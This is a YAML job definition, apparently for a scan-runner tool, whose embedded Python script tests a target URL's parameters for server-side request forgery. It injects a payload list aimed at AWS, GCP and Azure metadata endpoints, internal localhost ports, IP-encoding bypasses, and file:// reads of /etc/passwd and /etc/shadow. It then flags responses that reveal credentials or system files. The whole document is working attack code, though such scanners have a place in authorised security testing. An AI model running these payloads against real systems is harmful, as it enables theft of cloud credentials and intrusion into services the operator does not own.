name: ssrf-scan
description: |
  Server-Side Request Forgery (SSRF) scanner — test URL parameters
  for SSRF vulnerabilities using common bypass techniques, internal
  IP redirects, and cloud metadata endpoint access.
tags: [web, ssrf, vulnerability, security]
dispatch:
  inputs:
    target:
      required: true
      type: string
      description: Target URL with parameter (e.g. https://app.com/fetch?url=)
      alias: t
    callback:
      type: string
      default: ''
      description: Callback URL (e.g. Burp collaborator or interactsh)

jobs:
  scan:
    name: SSRF Detection
    outputs:
      finding_count: '{{ steps["test-ssrf"].outputs.finding_count }}'
      payloads_tested: '{{ steps["test-ssrf"].outputs.payloads_tested }}'
    steps:
    - name: test-ssrf
      script: |
        import urllib.request
        import urllib.error
        import urllib.parse
        import re

        target_url = '{{ inputs.target }}'
        callback = '{{ inputs.callback }}'

        print(f"=== SSRF SCAN: {target_url} ===\n")

        # Parse URL to find parameter
        parsed = urllib.parse.urlparse(target_url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            print("[-] No URL parameters found. Provide URL with parameter, e.g.:")
            print("    https://app.com/fetch?url=")
            print("    https://app.com/proxy?target=")

        findings = []
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # SSRF payloads
        payloads = {
            # Cloud metadata
            'aws_metadata': 'http://169.254.169.254/latest/meta-data/',
            'aws_metadata_v2': 'http://169.254.169.254/latest/api/token',
            'gcp_metadata': 'http://metadata.google.internal/computeMetadata/v1/',
            'azure_metadata': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',

            # Internal networks
            'localhost_80': 'http://127.0.0.1:80',
            'localhost_22': 'http://127.0.0.1:22',
            'localhost_3306': 'http://127.0.0.1:3306',
            'localhost_6379': 'http://127.0.0.1:6379',
            'localhost_8080': 'http://127.0.0.1:8080',

            # Bypass techniques
            'decimal_ip': 'http://2130706433/',  # 127.0.0.1
            'hex_ip': 'http://0x7f000001/',
            'octal_ip': 'http://0177.0.0.1/',
            'ipv6_localhost': 'http://[::1]/',
            'short_url': 'http://0/',
            'redirect_localhost': 'http://localtest.me/',

            # File protocol
            'file_passwd': 'file:///etc/passwd',
            'file_hosts': 'file:///etc/hosts',
            'file_shadow': 'file:///etc/shadow',
        }

        if callback:
            payloads['callback_http'] = callback
            payloads['callback_dns'] = callback.replace('http://', '').replace('https://', '')

        for param_name in params:
            print(f"--- Testing parameter: {param_name} ---\n")

            for payload_name, payload in payloads.items():
                new_params = dict(params)
                new_params[param_name] = [payload]
                query = urllib.parse.urlencode(new_params, doseq=True)
                test_url = f"{base_url}?{query}"

                try:
                    req = urllib.request.Request(test_url, method='GET')
                    req.add_header('User-Agent', 'Mozilla/5.0')
                    resp = urllib.request.urlopen(req, timeout=5)
                    body = resp.read().decode('utf-8', errors='replace')[:2000]
                    status = resp.status

                    # Check for indicators
                    indicators = {
                        'aws_metadata': ['ami-id', 'instance-id', 'security-credentials', 'iam'],
                        'gcp_metadata': ['project', 'instance', 'attributes'],
                        'file_passwd': ['root:', '/bin/bash', '/bin/sh'],
                        'file_hosts': ['localhost', '127.0.0.1'],
                        'file_shadow': ['root:', '$6$', '$y$'],
                    }

                    matched = False
                    for indicator_key, patterns in indicators.items():
                        if indicator_key in payload_name:
                            for pattern in patterns:
                                if pattern in body:
                                    severity = 'CRITICAL' if 'metadata' in payload_name or 'shadow' in payload_name else 'HIGH'
                                    finding = f'[{severity}] {payload_name}: {pattern} found in response'
                                    findings.append(finding)
                                    print(f"  [!] {finding}")
                                    matched = True
                                    break

                    if not matched and status == 200 and len(body) > 50:
                        # Check response differs from baseline
                        if payload_name.startswith('localhost'):
                            findings.append(f'[MEDIUM] {payload_name}: Got {status} with {len(body)} bytes')
                            print(f"  [?] {payload_name}: {status} ({len(body)} bytes)")

                except urllib.error.HTTPError as e:
                    if e.code in (500, 502, 503):
                        print(f"  [?] {payload_name}: Server error {e.code} (possible blind SSRF)")
                except Exception:
                    pass

        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
            f.write(f"finding_count={len(findings)}\n")
            f.write(f"payloads_tested={len(payloads)}\n")

        print(f"\n=== RESULTS: {len(findings)} findings ===")
        for finding in findings:
            print(f"  {finding}")
        if not findings:
            print("  No SSRF indicators detected")
            print("  Tip: Use --input callback=<interactsh URL> for blind SSRF detection")
      log-stdout: true
